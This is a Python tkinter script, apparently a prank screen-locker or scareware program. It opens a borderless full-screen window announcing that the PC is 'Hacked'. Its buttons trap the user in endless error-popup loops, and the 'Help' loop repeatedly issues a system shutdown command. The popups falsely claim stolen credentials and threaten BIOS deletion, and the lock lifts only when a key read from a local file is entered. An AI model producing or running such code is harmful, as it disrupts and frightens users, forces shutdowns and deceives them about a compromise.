

from tkinter import *
from tkinter import messagebox
import socket
import os

######################### KEY GOES HERE #####################################
global key
keyFile = open("key", "r+")
key = keyFile.read()
keyFile.close()

#######################
class Hacked:
    def __init__(self, master):

        def msg1():
            while True:
                messagebox.showerror("HeY?", "How about No? I don't want to go away.")
                messagebox.showerror("Why?", "You want me to go away?")
                messagebox.showerror(":(", "I didn't even do anything except Stealing your Credentials.")
                messagebox.showerror(":|", "System Error!")

        def msg2():
            while True:
                messagebox.showerror("Help", "I'm here to help.")
                messagebox.showerror("wha?", "What do you want?")
                messagebox.showerror(":)", "no man let me delete BIOS pls")
                messagebox.showerror(":|", "System EXIT!")
                os.system("shutdown -s")

        
        def keyCheck():
            if(self.key.get() == key):
                messagebox.showwarning("SUCCESS", "You Broke me. *_*")
                exit(1)
            else:
                messagebox.showerror("ERRORRR", "Uveveve enteyeye Ogwyobwm OSAS")
                msg1()
            
        sysname = socket.gethostname()
        self.master = master

        self.text = Label(master, text = "PC : "+sysname+" is Hacked.", fg='cyan', bg='gray9')
        self.text.pack()
        self.text.configure(font = ('Arial', 60))

        self.but = Button(master, text= "Remove Virus", fg='red', bg='gray9', command = lambda: msg1())
        self.but.pack()
        self.but.configure(font = ('Arial', 25))

        self.help = Button(master, text= "Help", fg='cyan', bg='gray9', command = lambda: msg2())
        self.help.pack()
        self.help.configure(font = ('Arial', 25))

        self.key = Entry(master)
        self.key.insert(0,"Enter Unlock Key Here ")
        self.key.pack()
        self.key.get()

        self.submit = Button(master, text = "Submit", fg='red', bg='gray9', command = lambda: keyCheck())
        self.submit.pack()





        self.text2 = Label(master, text = "RIP..", fg='red', bg='gray9')
        self.text2.pack()
        self.text2.configure(font = ('Arial', 60))



root = Tk()
root.title("Computer Hacked.")
root.configure(background="gray9")
root.overrideredirect(True)
root.geometry("1500x1000")
app = Hacked(root)
root.mainloop()